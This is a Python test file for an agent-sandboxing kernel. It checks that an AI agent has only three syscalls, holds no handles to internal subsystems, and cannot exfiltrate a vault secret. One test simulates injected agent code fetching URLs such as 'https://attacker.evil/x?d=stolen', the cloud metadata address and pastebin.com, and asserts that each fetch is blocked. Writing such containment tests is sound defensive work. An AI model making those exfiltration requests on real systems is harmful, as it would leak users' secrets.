"""The invariant that makes this a kernel (INV-1): no path to an effect but the syscall.

These tests assert the property behaviourally, not just structurally: the agent's API
surface is exactly the three syscalls, and even arbitrary agent-controlled code routed
through the code tool cannot reach an unapproved host or obtain a secret.
"""

from mandate.demo import DEMO_SECRET_VALUE, build_bundle, build_tools
from mandate.kernel import SyscallGateway
from mandate.sdk import AgentClient


def agent_for():
    gw = SyscallGateway(build_bundle(), tools=build_tools(), vault={"vault://acme/ss-key": DEMO_SECRET_VALUE})
    return gw, AgentClient(gw)


def test_agent_surface_is_exactly_the_three_syscalls():
    public = {n for n in dir(AgentClient) if not n.startswith("_")}
    # subject is a read-only convenience view; the verbs are the three syscalls.
    assert public == {"tool_call", "memory_write", "approval_request", "subject"}


def test_agent_holds_no_handle_to_a_subsystem():
    _, agent = agent_for()
    # No public attribute exposes the broker, egress, budget, memory, or audit.
    leaked = {
        name
        for name in dir(agent)
        if not name.startswith("_")
        and name in {"broker", "egress", "budget", "memory", "audit", "vault", "gateway"}
    }
    assert leaked == set()


def test_injected_code_cannot_exfiltrate_even_with_a_guessed_url():
    _, agent = agent_for()
    # Simulated injection: agent code tries several exfil hosts. All are refused.
    for host in ["attacker.evil", "evil.example", "169.254.169.254", "pastebin.com"]:
        res = agent.tool_call(
            "fs.workspace.rw", "code_exec", {"fetch": [f"https://{host}/x?d=stolen"]}
        )
        assert res.status == "blocked", host


def test_injected_code_has_no_route_to_the_secret():
    _, agent = agent_for()
    # The code tool has no secret accessor; the best injection can do is try to fetch,
    # which is blocked, and it never has the key to begin with.
    res = agent.tool_call("fs.workspace.rw", "code_exec",
                          {"fetch": ["https://api.semanticscholar.org/leak"]})
    # Even reaching an *allowed* host, no secret is available to the code tool.
    assert DEMO_SECRET_VALUE not in repr(res.result)
